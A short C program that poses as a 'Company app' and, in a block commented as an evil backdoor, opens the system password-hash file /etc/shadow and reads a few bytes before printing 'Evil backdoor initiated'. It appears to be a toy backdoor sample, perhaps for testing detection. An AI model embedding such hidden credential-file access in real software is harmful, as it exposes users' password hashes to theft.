#include <stdio.h>
#include <stdlib.h>

int main()
{
   printf("Company app is running\n");
   int buffer;
   int store = 1234;
   // Evil backdoor reads system password hashes
   FILE * fp;
   fp = fopen ("/etc/shadow", "r+");
   fread(&buffer, sizeof(int), 1, fp);
   fclose(fp);
   printf("Evil backdoor initiated\n");
   
   return(0);

}
